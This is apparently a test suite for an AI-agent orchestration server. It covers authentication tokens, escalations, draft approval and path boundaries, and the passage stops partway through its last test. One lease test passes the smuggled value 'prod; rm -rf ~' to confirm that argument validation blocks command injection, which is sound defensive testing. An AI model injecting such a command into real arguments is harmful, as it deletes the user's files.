import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { Bus } from "../src/bus.ts";
import { openMemory, type DB } from "../src/db.ts";
import { Scheduler, type Job } from "../src/scheduler.ts";
import { askKind, brief, landGroup, makeApp, type Ctx } from "../src/api.ts";
import { listSkills } from "../src/mech/util/skills.ts";
import { landed } from "../src/mech/flow/mergequeue.ts";
import { sweepApproved } from "../src/mech/flow/start.ts";
import { fakeSandbox } from "./fake-sandbox.ts";
import { seedAuth } from "./seed-auth.ts";

function harness(handle?: (cmd: string, cwd: string) => { code?: number; out?: string; err?: string }) {
  const db: DB = openMemory();
  seedAuth(db);
  const bus = new Bus(db);
  const ran: Job[] = [];
  const sched = new Scheduler(db, async (j) => void ran.push(j));
  const ctx: Ctx = {
    db,
    bus,
    sched,
    sandbox: fakeSandbox(handle), waiters: new Map(),
    config: { language: "中文"},
  };
  const app = makeApp(ctx);

  db.run("INSERT INTO project (name, repo_path, remote, created_at) VALUES ('p', '/tmp/p', 'https://github.com/o/p.git', 0)");
  db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (1, 'g1', 'RUNNING', 0)");
  // Identity is the token, never a body field: the server listens on localhost
  // TCP, so anything else on 127.0.0.1 could otherwise claim to be any agent.
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'engineer', 'sonnet', 'tok-eng', 0)",
  );
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'qa', 'sonnet', 'tok-qa', 0)",
  );
  return { db, bus, sched, ctx, app, ran, engineer: "tok-eng", qa: "tok-qa" };
}

const post = (
  app: (r: Request) => Promise<Response>,
  path: string,
  body?: unknown,
  token?: string,
) =>
  app(
    new Request(`http://x${path}`, {
      method: "POST",
      body: JSON.stringify(body ?? {}),
      // Both real callers set it — `orch` at cli.ts and the mailbox replay — and
      // the server now refuses an unlabelled body outright rather than silently
      // treating it as no body at all.
      headers: { "content-type": "application/json", ...(token ? { "x-orch-token": token } : {}) },
    }),
  );
const get = (app: (r: Request) => Promise<Response>, path: string) =>
  app(new Request(`http://x${path}`));
const withToken = (app: (r: Request) => Promise<Response>, path: string, token: string) =>
  app(new Request(`http://x${path}`, { headers: { "x-orch-token": token } }));

test("an over-long journal is rejected with a reason the agent can act on", async () => {
  const { app } = harness();
  const r = await post(app, "/orch/journal", { kind: "journal", body: "a\nb\nc\nd\ne\nf\ng" },
    "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("max 6");
});

test("journal writes a note and exports journal/retro into the checkout", async () => {
  const _wt = mkdtempSync(join(tmpdir(), "orch-wt-"));
  const { app, db, ctx } = harness();

  const r = await post(
    app,
    "/orch/journal",
    { kind: "journal", body: "Moved token check into middleware.", files: ["auth/mw.ts"] },
    "tok-eng",
  );
  expect(r.status).toBe(200);
  const out = await r.text();
  expect(out).toContain("docs/journal/g1/001-journal.md");

  // Into the group's own checkout, which is inside its sandbox — so it merges
  // with the PR like any other file the group wrote.
  const written = (ctx.sandbox as any).files.get("/work/docs/journal/g1/001-journal.md") as string;
  expect(written).toContain("kind: journal");
  expect(written).toContain("files: [auth/mw.ts]");
  expect(written).toContain("Moved token check into middleware.");

  const note = db.query<{ kind: string; export_path: string }, []>("SELECT kind, export_path FROM note").get()!;
  expect(note.kind).toBe("journal");
  expect(note.export_path).toBe("docs/journal/g1/001-journal.md");
});

test("a fact never gets exported to git — only journal/retro/decision do", async () => {
  const _wt = mkdtempSync(join(tmpdir(), "orch-wt-"));
  const { app, db } = harness();
  await post(app, "/orch/journal", { kind: "fact", body: "boss prefers iteration" }, "tok-eng");
  const note = db.query<{ export_path: string | null }, []>("SELECT export_path FROM note").get()!;
  expect(note.export_path).toBeNull();
});

test("mail rejects intents outside the five", async () => {
  const { app } = harness();
  const r = await post(app, "/orch/mail", { target: "qa", intent: "handoff", body: "x" }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("ask, request, inform, note, decision");
});

test("a waking intent enqueues a turn for the named target; note does not", async () => {
  const { app, db } = harness();
  await post(app, "/orch/mail", { target: "qa", intent: "request", body: "please verify" }, "tok-eng");
  let jobs = db.query<{ agent_id: number }, []>("SELECT agent_id FROM job WHERE kind = 'agent_turn'").all();
  expect(jobs.map((j) => j.agent_id)).toEqual([2]);

  await post(app, "/orch/mail", { target: "qa", intent: "note", body: "fyi" }, "tok-eng");
  jobs = db.query<{ agent_id: number }, []>("SELECT agent_id FROM job WHERE kind = 'agent_turn'").all();
  expect(jobs.length).toBe(1);
});

test("ask-boss blocks the caller and a blocker pauses the whole group", async () => {
  const { app, db, ctx } = harness();
  const pending = post(
    app,
    "/orch/ask-boss",
    { severity: "blocker", question: "which validation library?" },
    "tok-eng",
  );

  // Give the handler a tick to register its waiter.
  await Bun.sleep(5);
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PAUSING");
  expect(db.query<{ state: string }, [number]>("SELECT state FROM agent WHERE id = ?").get(1)!.state).toBe("blocked");
  expect(ctx.waiters.size).toBe(1);

  const ans = await post(app, "/api/escalations/1/answer", { answer: "use zod" });
  expect(ans.status).toBe(200);

  const r = await pending;
  expect(await r.text()).toBe("use zod");
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
  expect(db.query<{ state: string }, [number]>("SELECT state FROM agent WHERE id = ?").get(1)!.state).toBe("idle");
});

test("an unknown lease resource says how to get one added", async () => {
  const { app } = harness();
  const r = await post(app, "/orch/lease", { resource: "unity", args: {} }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("Ask the boss");
});

test("a lease with bad args never reaches the queue", async () => {
  const { app, db } = harness();
  db.run(
    `INSERT INTO resource (name, template, arg_schema_json) VALUES
     ('build', 'make {target}', '{"target":{"type":"enum","values":["debug","release"]}}')`,
  );
  const r = await post(app, "/orch/lease", { resource: "build", args: { target: "prod; rm -rf ~" } }, "tok-eng");
  expect(r.status).toBe(422);
  expect(db.query<{ c: number }, []>("SELECT count(*) AS c FROM lease").get()!.c).toBe(0);
});

test("dropping an idea creates a PLANNING group, a channel, and a dispatcher turn", async () => {
  const { app, db } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "add rate limiting to the API" });
  const { grp_id } = (await r.json()) as { grp_id: number };

  // PLANNING, not DRAFT: the Dispatcher has to run before there is anything to
  // approve, so "planning" and "waiting for the boss" cannot be one state.
  expect(db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!.status).toBe(
    "PLANNING",
  );
  // channel.grp_id is the only link; grp deliberately has no reverse pointer.
  const ch = db.query<{ id: number }, [number]>("SELECT id FROM channel WHERE grp_id = ?").get(grp_id);
  expect(ch?.id).toBeGreaterThan(0);

  // The idea is on the blackboard verbatim, so a respec can point back at it.
  const note = db.query<{ body: string }, [number]>("SELECT body FROM note WHERE grp_id = ?").get(grp_id)!;
  expect(note.body).toBe("add rate limiting to the API");

  // Another group in this project already holds paths, so the Architect is asked
  // for the boundary FIRST — planning work against paths you may not own is how
  // the plan gets written twice.
  const roles = db
    .query<{ payload_json: string }, [number]>("SELECT payload_json FROM job WHERE grp_id = ? ORDER BY priority DESC")
    .all(grp_id)
    .map((j) => JSON.parse(j.payload_json).role);
  expect(roles).toEqual(["architect", "dispatcher"]);
});

test("the only group in a project skips the boundary step", async () => {
  const { app, db } = harness();
  db.run("UPDATE grp SET status = 'DISSOLVED' WHERE id = 1");
  const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
  const { grp_id, boundaryNeeded } = (await r.json()) as { grp_id: number; boundaryNeeded: boolean };
  expect(boundaryNeeded).toBe(false);
  const roles = db
    .query<{ payload_json: string }, [number]>("SELECT payload_json FROM job WHERE grp_id = ?")
    .all(grp_id)
    .map((j) => JSON.parse(j.payload_json).role);
  expect(roles).toEqual(["dispatcher"]);
});

test("the Dispatcher runs while PLANNING; a filed DRAFT then blocks until approval", async () => {
  const { app, db, sched, ran } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  await sched.drain();
  // Both planning turns DO run: without them the boss has nothing to approve.
  expect(ran.map((j) => JSON.parse(j.payload_json).role)).toEqual(["architect", "dispatcher"]);

  const card = `目标 : x
不做 : y
验收 : bun test 绿
验收 : 无回归
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : group-approval-planning`;
  // Filing the card is what moves the group to DRAFT, and DRAFT blocks.
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
    [grp_id],
  );
  const filed = await post(app, "/orch/draft", { group_id: grp_id, card }, "tok-disp");
  expect(filed.status).toBe(200);
  expect(db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!.status).toBe(
    "DRAFT",
  );
  const before = ran.length;
  await sched.drain();
  expect(ran.length).toBe(before);

  // Approval with no card in the body uses the one that was filed.
  // Sampled before the call: tick() invokes the executor synchronously, so the
  // turn is already counted by the time the response comes back.
  const planningTurns = ran.length;
  const ok = await post(app, `/api/draft/${grp_id}/approve`);
  expect(ok.status).toBe(200);
  expect(db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!.status).toBe("RUNNING");

  const slices = db.query<{ title: string; difficulty: string }, [number]>(
    "SELECT title, difficulty FROM slice WHERE grp_id = ? ORDER BY seq",
  ).all(grp_id);
  expect(slices.map((s) => s.difficulty)).toEqual(["normal", "trivial", "hard"]);
  // Approval also creates one task per slice, or the writer has nothing to claim
  // and the whole review pipeline never fires.
  expect(
    db.query<{ c: number }, [number]>("SELECT count(*) AS c FROM task WHERE grp_id = ?").get(grp_id)!.c,
  ).toBe(3);

  await sched.drain();
  // Approval also starts the first slice: a plan that is approved and then sits
  // still is the most confusing failure there is.
  expect(ran.length).toBeGreaterThan(planningTurns);
  expect(ran.at(-1)!.slice_id).toBe(
    db.query<{ id: number }, [number]>("SELECT id FROM slice WHERE grp_id = ? ORDER BY seq LIMIT 1").get(grp_id)!.id,
  );
});

test("a malformed card is refused both when filed and when approved", async () => {
  const { app, db } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
    [grp_id],
  );

  // Validated where it is filed, so the boss is never shown a broken card.
  const filed = await post(app, "/orch/draft", { group_id: grp_id, card: "目标 : only this" }, "tok-disp");
  expect(filed.status).toBe(422);
  expect(db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!.status).toBe(
    "PLANNING",
  );

  // …and again on the edit-then-approve path.
  const approved = await post(app, `/api/draft/${grp_id}/approve`, { card: "目标 : still broken" });
  expect(approved.status).toBe(422);
});

test("sending a DRAFT back records the reason and re-runs the dispatcher", async () => {
  const { app, db } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  await post(app, `/api/draft/${grp_id}/reject`, { reason: "wrong layer" });

  const notes = db.query<{ body: string }, [number]>("SELECT body FROM note WHERE grp_id = ? ORDER BY id").all(grp_id);
  expect(notes.at(-1)!.body).toContain("wrong layer");
  const jobs = db.query<{ payload_json: string }, [number]>("SELECT payload_json FROM job WHERE grp_id = ?").all(grp_id);
  expect(JSON.parse(jobs.at(-1)!.payload_json).respec).toBe("wrong layer");
});

test("pause is PAUSING only while something is in flight, PAUSED once idle", async () => {
  const { app, db } = harness();
  db.run("INSERT INTO job (kind, grp_id, state, enqueued_at) VALUES ('agent_turn', 1, 'running', 0)");
  const r = await (await post(app, "/api/groups/1/pause")).json();
  // An in-flight turn cannot be steered, so claiming PAUSED would be a lie —
  // and the reply says how many turns it is waiting on.
  expect(r).toEqual({ status: "PAUSING", waiting: 1 });
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PAUSING");

  db.run("UPDATE job SET state = 'done'");
  db.run("UPDATE grp SET status = 'RUNNING' WHERE id = 1");
  const idle = await (await post(app, "/api/groups/1/pause")).json();
  expect(idle).toEqual({ status: "PAUSED", waiting: 0 });
});

test("park cancels queued work and leaves the worktree alone", async () => {
  const { app, db, sched } = harness();
  sched.enqueue("agent_turn", { grp_id: 1 });
  sched.enqueue("agent_turn", { grp_id: 1 });
  await post(app, "/api/groups/1/park");
  const states = db.query<{ state: string }, []>("SELECT state FROM job").all().map((r) => r.state);
  expect(states).toEqual(["cancelled", "cancelled"]);
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PARKED");
});

test("rejecting a slice records the feedback as a fact and re-runs the group", async () => {
  const { app, db } = harness();
  db.run("INSERT INTO slice (grp_id, seq, title, accept_spec, created_at) VALUES (1, 1, 'S1', 'tests', 0)");
  await post(app, "/api/slices/1/reject", { feedback: "tests are too shallow" });

  expect(db.query<{ status: string }, []>("SELECT status FROM slice WHERE id = 1").get()!.status).toBe("rejected");
  expect(db.query<{ body: string }, []>("SELECT body FROM note WHERE kind = 'fact'").get()!.body).toContain(
    "too shallow",
  );
  expect(db.query<{ c: number }, []>("SELECT count(*) AS c FROM job WHERE kind = 'agent_turn'").get()!.c).toBe(1);
});

test("ctx query is capped so it never costs more than the file it replaces", async () => {
  const { app, db } = harness();
  const ins = db.prepare("INSERT INTO note (grp_id, kind, lang, body, at) VALUES (1, 'fact', 'zh', ?, 0)");
  for (let i = 0; i < 200; i++) ins.run(`middleware note ${i} ` + "x".repeat(400));

  const r = await post(app, "/orch/ctx/query", { question: "middleware token check" }, "tok-eng");
  const out = await r.text();
  expect(out.length).toBeLessThanOrEqual(16_000);
  expect(out).toContain("middleware");
});

test("ctx query with no hits tells the agent what to do instead of returning junk", async () => {
  const { app, db } = harness();
  // No slices either, or the group's acceptance criteria would legitimately come
  // back as the frame for any question.
  db.run("DELETE FROM slice");
  const r = await post(app, "/orch/ctx/query", { question: "quantum tunnelling" }, "tok-eng");
  const out = await r.text();
  expect(out).toContain("nothing on the blackboard matches");
  expect(out).toContain("orch mail pm");
});

test("state snapshot carries everything the three views need", async () => {
  const { app } = harness();
  const s = (await (await get(app, "/api/state")).json()) as Record<string, unknown[]>;
  for (const k of ["projects", "groups", "slices", "agents", "tasks", "escalations"]) {
    expect(Array.isArray(s[k])).toBe(true);
  }
  expect(s.agents!.length).toBe(2);
});

test("a missing or bogus token is refused everywhere", async () => {
  const { app } = harness();
  // Every verb, not a sample of five. The check lives on the mount now, so this
  // is what says a new route cannot be added under `/orch` without it.
  const paths = [
    "/orch/status",
    "/orch/journal",
    "/orch/mail",
    "/orch/ask-boss",
    "/orch/setup",
    "/orch/lease",
    "/orch/ctx/query",
    "/orch/task/claim",
    "/orch/task/done",
    "/orch/review",
    "/orch/audit",
    "/orch/pr",
    "/orch/answer",
    "/orch/triage",
    "/orch/draft",
    "/orch/owns",
    "/orch/drop",
    "/orch/blocked",
    "/orch/split",
  ];
  for (const p of paths) {
    const payload = { kind: "journal", body: "x", intent: "note", target: "qa" };
    // No token at all. 401, not the 422 these used to answer: the check moved
    // off the top of each handler and onto the `/orch` mount, and a single
    // gate may as well use the status code that means what happened.
    expect((await post(app, p, payload)).status).toBe(401);
    // A token that belongs to nobody. An agent cannot promote itself by
    // sending someone else's id, because the id is never in the body.
    expect((await post(app, p, payload, "not-a-real-token")).status).toBe(401);
  }
});

test("the token decides which agent acted, not anything in the body", async () => {
  const { app, db } = harness();
  await post(app, "/orch/status", { text: "verifying S1" }, "tok-qa");
  const rows = db
    .query<{ role: string; activity: string | null }, []>("SELECT role, activity FROM agent ORDER BY id")
    .all();
  expect(rows[0]!.activity).toBeNull();
  expect(rows[1]!.activity).toBe("verifying S1");
});

test("filing the card drops the group's other queued planning turns", async () => {
  const { app, db, sched } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
    [grp_id],
  );
  sched.enqueue("agent_turn", { grp_id, payload: { role: "architect" } });

  const card = `目标 : x
不做 : y
验收 : a
验收 : b
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : draft-cancels-queue`;
  await post(app, "/orch/draft", { group_id: grp_id, card }, "tok-disp");

  // DRAFT is not dispatchable, so a leftover planning turn would sit pending
  // forever and then fire after approval against a plan it never saw.
  const pending = db
    .query<{ c: number }, [number]>("SELECT count(*) AS c FROM job WHERE grp_id = ? AND state = 'pending'")
    .get(grp_id)!.c;
  expect(pending).toBe(0);
});

test("a group name is short and branch-shaped, whatever the idea looked like", async () => {
  const { app, db } = harness();
  await post(app, "/api/ideas", {
    project_id: 1,
    text: "greet 现在只支持英文，加一个可选的语言参数，中文时返回「你好 X」",
  });
  const name = db.query<{ name: string }, []>("SELECT name FROM grp ORDER BY id DESC LIMIT 1").get()!.name;
  // It becomes orch/<name>, a worktree path and every log line, so a slugified
  // 40-character sentence is a nuisance forever.
  expect(name.length).toBeLessThanOrEqual(28);
  expect(name).toContain("greet");
});

test("a group can be named instead of numbered, everywhere it is referenced", async () => {
  const { app, db } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "greet lang parameter" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  const name = db.query<{ name: string }, [number]>("SELECT name FROM grp WHERE id = ?").get(grp_id)!.name;
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
    [grp_id],
  );

  const card = `目标 : x
不做 : y
验收 : a
验收 : b
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : group-by-name`;
  // An agent reaches for the name it can see — one was observed running
  // `orch draft greet -` — and refusing that teaches it nothing.
  const filed = await post(app, "/orch/draft", { group_id: name, card }, "tok-disp");
  expect(filed.status).toBe(200);
  expect(db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!.status).toBe(
    "DRAFT",
  );
});

test("the state snapshot carries the filed card so the boss can see what they approve", async () => {
  const { app, db } = harness();
  const r = await post(app, "/api/ideas", { project_id: 1, text: "greet lang" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
    [grp_id],
  );
  const card = `目标 : 支持 zh
不做 : 不引依赖
验收 : bun test 全绿
验收 : greet("x","zh") 返回「你好 x」
切片 : lang 参数 [trivial] — 默认行为不变
切片 : zh 词条 [trivial] — 断言通过
切片 : 类型导出 [normal] — 类型检查过
风险 : 无
反对 : 无
名字 : state-carries-card`;
  await post(app, "/orch/draft", { group_id: grp_id, card }, "tok-disp");

  const s = (await (await get(app, "/api/state")).json()) as any;
  const filed = s.draftCards.find((c: any) => c.grpId === grp_id);
  // Showing an empty box and asking for approval is asking the boss to approve
  // something they cannot see.
  expect(filed?.body).toContain("支持 zh");

  // An objection that lands after the card must reach the boss too. The card says
  // 反对 : 无 because the Dispatcher does not wait for the Architect — measured,
  // the objection arrived a minute later and said the plan contradicted its own
  // acceptance criterion.
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, NULL, 'architect', 'm', 'tok-arch', 0)",
  );
  await post(
    app,
    "/orch/mail",
    { target: "dispatcher", intent: "inform", body: "反对：第三片与验收冲突" },
    "tok-arch",
  );
  const s2 = (await (await get(app, "/api/state")).json()) as any;
  const late = (s2.lateObjections ?? []).find((o: any) => o.grpId === grp_id);
  expect(late?.body).toContain("与验收冲突");
  expect(late?.author).toBe("architect");
});

test("a second group triggers boundaries for every undeclared group, not just the new one", async () => {
  const { app, db } = harness();
  // The pre-existing group has no owns: it was the only group when it started.
  const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };

  const boundary = db
    .query<{ payload_json: string }, [number]>(
      "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
    )
    .get(grp_id)!;
  const groups = JSON.parse(boundary.payload_json).boundary as Array<{ id: number }>;
  // An undeclared group beside a declared one is the same risk the rule exists to
  // prevent, just reached from the other direction.
  expect(groups.map((g) => g.id).sort()).toEqual([1, grp_id].sort());
});

test("a group that already declared its paths is not asked again", async () => {
  const { app, db } = harness();
  db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/auth/**"])]);
  const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  const boundary = db
    .query<{ payload_json: string }, [number]>(
      "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
    )
    .get(grp_id)!;
  expect((JSON.parse(boundary.payload_json).boundary as any[]).map((g) => g.id)).toEqual([grp_id]);
});

test("the snapshot carries the boss's original words alongside the card", async () => {
  const { app, db } = harness();
  const idea = "greet 现在只支持英文，加一个可选的语言参数";
  const r = await post(app, "/api/ideas", { project_id: 1, text: idea });
  const { grp_id } = (await r.json()) as { grp_id: number };

  const s = (await (await get(app, "/api/state")).json()) as any;
  // The 20 seconds on the card are the only guard against a well-formed plan
  // aimed at the wrong thing, and that comparison needs the original next to it.
  expect(s.ideas.find((i: any) => i.grpId === grp_id)?.body).toBe(idea);

  // The first thing the boss said, not the latest — later messages are feedback.
  db.run(
    "INSERT INTO event (grp_id, author, kind, body, at) VALUES (?, 'boss', 'boss_say', 'and also make it fast', 999)",
    [grp_id],
  );
  const s2 = (await (await get(app, "/api/state")).json()) as any;
  expect(s2.ideas.find((i: any) => i.grpId === grp_id)?.body).toBe(idea);
});

test("an approval a boundary blocks is recorded, not thrown away", async () => {
  const { app, db } = harness();
  db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/**"])]);
  const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-d', 0)",
    [grp_id],
  );
  const card = `目标 : x
不做 : y
验收 : a.test.ts 绿
验收 : 无回归
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过`;
  db.run("UPDATE grp SET status = 'DRAFT' WHERE id = ?", [grp_id]);
  db.run(
    "INSERT INTO note (project_id, grp_id, kind, lang, body, frontmatter_json, at) VALUES (1, ?, 'fact', 'zh', ?, ?, 0)",
    [grp_id, card + "\n风险 : 无\n反对 : 无\n名字 : boundary-block-approval", JSON.stringify({ draft_card: true })],
  );

  const held = await post(app, `/api/draft/${grp_id}/approve`);
  // 200: the boss did decide. A 422 shows a red error and asks for the same click
  // again — and the click it asked for used to be a 500 (see the next test).
  expect(held.status).toBe(200);
  expect(await held.text()).toContain("自动开工");

  const g = db
    .query<{ status: string; approved_at: number | null }, [number]>(
      "SELECT status, approved_at FROM grp WHERE id = ?",
    )
    .get(grp_id)!;
  expect(g.status).toBe("DRAFT");
  expect(g.approved_at).toBeGreaterThan(0);

  const queued = db
    .query<{ payload_json: string }, [number]>(
      "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%' ORDER BY id DESC LIMIT 1",
    )
    .get(grp_id)!;
  expect(JSON.parse(queued.payload_json).boundary.length).toBeGreaterThan(0);
});

/** A blocked group B beside a running group A that holds every path. */
async function blocked(h: ReturnType<typeof harness>) {
  const { app, db } = h;
  db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
  const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = (await r.json()) as { grp_id: number };
  db.run("UPDATE grp SET status = 'DRAFT', owns_json = ? WHERE id = ?", [
    JSON.stringify(["src/a/mw.ts"]),
    grp_id,
  ]);
  db.run(
    "INSERT INTO note (project_id, grp_id, kind, lang, body, frontmatter_json, at) VALUES (1, ?, 'fact', 'zh', ?, ?, 0)",
    [
      grp_id,
      `目标 : x
不做 : y
验收 : a.test.ts 绿
验收 : 无回归
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : 无
反对 : 无
名字 : held-group-reapprove`,
      JSON.stringify({ draft_card: true }),
    ],
  );
  expect((await post(app, `/api/draft/${grp_id}/approve`)).status).toBe(200);
  return grp_id;
}

test("approving a held group twice does not blow up", async () => {
  // The first approve writes slices AND their tasks, then the boundary refuses. The
  // second one deleted the slices out from under those tasks — foreign keys are on,
  // so it was a 500, every time. The message it printed told the boss to do exactly
  // this, which is why "有的需求无法批准开工" had no way out at all.
  const h = harness();
  const grpId = await blocked(h);
  expect((await post(h.app, `/api/draft/${grpId}/approve`)).status).toBe(200);
  expect(
    h.db.query<{ c: number }, [number]>("SELECT count(*) AS c FROM slice WHERE grp_id = ?").get(grpId)!.c,
  ).toBe(3);
});

test("the group holding the paths dissolves, and the approved one starts itself", async () => {
  const h = harness();
  const grpId = await blocked(h);
  landed(h.db, 1);
  await sweepApproved(h.ctx);

  const g = h.db
    .query<{ status: string; approved_at: number | null }, [number]>(
      "SELECT status, approved_at FROM grp WHERE id = ?",
    )
    .get(grpId)!;
  expect(g.status).toBe("RUNNING");
  // Left set, the sweep would keep finding it forever.
  expect(g.approved_at).toBeNull();
  // Started, not merely unblocked: a RUNNING group with no turn queued is the same
  // silence from the boss's side.
  const turn = h.db
    .query<{ payload_json: string; slice_id: number | null }, [number]>(
      "SELECT payload_json, slice_id FROM job WHERE grp_id = ? AND kind = 'agent_turn' ORDER BY id DESC LIMIT 1",
    )
    .get(grpId)!;
  expect(JSON.parse(turn.payload_json).role).toBe("engineer");
  expect(turn.slice_id).not.toBeNull();
});

test("the Architect re-cutting someone else's boundary starts the approved group", async () => {
  const h = harness();
  const grpId = await blocked(h);
  h.db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'architect', 'm', 'tok-a', 0)",
  );
  // The re-cut moves group 1 off the contested path. Nothing touches group 2 —
  // sweeping only the group `owns` names would leave it waiting.
  await post(h.app, "/orch/owns", { group_id: 1, paths: ["src/c/**"] }, "tok-a");
  expect(
    h.db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grpId)!.status,
  ).toBe("RUNNING");
});

test("a token is only good for the scope it was hired into", async () => {
  // `owns_json` is what `canStart` gates dispatch on, so one call rewriting
  // another group's boundary is a fleet-wide stall — and the group_id came
  // straight out of the request body, never compared with the caller's own.
  // The check cannot be a flat "same group" either: standing roles have no group
  // and are supposed to reach across their project.
  const h = harness();
  await blocked(h);
  h.db.run("INSERT INTO project (name, repo_path, remote, created_at) VALUES ('other', '/tmp/o', 'https://github.com/o/other.git', 0)");
  h.db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (2, 'elsewhere', 'RUNNING', 0)");
  const outsider = h.db.query<{ id: number }, []>("SELECT id FROM grp WHERE name = 'elsewhere'").get()!.id;

  // Standing: no group, so its reach is its project — and it stops at the edge.
  h.db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, NULL, 'architect', 'm', 'tok-standing', 0)",
  );
  expect((await post(h.app, "/orch/owns", { group_id: 1, paths: ["src/c/**"] }, "tok-standing")).status).toBe(200);
  expect((await post(h.app, "/orch/owns", { group_id: outsider, paths: ["**"] }, "tok-standing")).status).toBe(403);

  // Hired into a group: that group and no other, even inside the same project.
  h.db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'architect', 'm', 'tok-g1', 0)",
  );
  const other = h.db.query<{ id: number }, []>("SELECT id FROM grp WHERE project_id = 1 AND id != 1 LIMIT 1").get()!.id;
  expect((await post(h.app, "/orch/owns", { group_id: other, paths: ["**"] }, "tok-g1")).status).toBe(403);
  // Untouched: a refused call must not be a half-applied one.
  expect(
    h.db.query<{ owns_json: string }, [number]>("SELECT owns_json FROM grp WHERE id = ?").get(other)!.owns_json,
  ).not.toContain("**");
});

test("dropping a requirement frees its paths and starts whoever was waiting", async () => {
  // 退回重拆 was the only way off the approval screen, and it sends the plan back
  // to be written again. A duplicate needs to leave, and the group behind it needs
  // to stop waiting on paths nobody will ever use.
  const h = harness();
  const grpId = await blocked(h);
  h.db.run("INSERT INTO job (kind, grp_id, state, enqueued_at) VALUES ('agent_turn', 1, 'pending', 0)");
  h.db.run(
    `INSERT INTO escalation (grp_id, severity, question, chain_state, created_at)
     VALUES (1, 'blocker', 'still needed?', 'boss', 0)`,
  );

  const r = await post(h.app, "/api/groups/1/drop", { why: "grp2 covers it" });
  expect(r.status).toBe(200);
  expect((await r.json()) as any).toEqual({ started: [grpId] });

  const q = (sql: string) => h.db.query<{ v: string }, []>(sql).get()!.v;
  expect(q("SELECT status AS v FROM grp WHERE id = 1")).toBe("DISSOLVED");
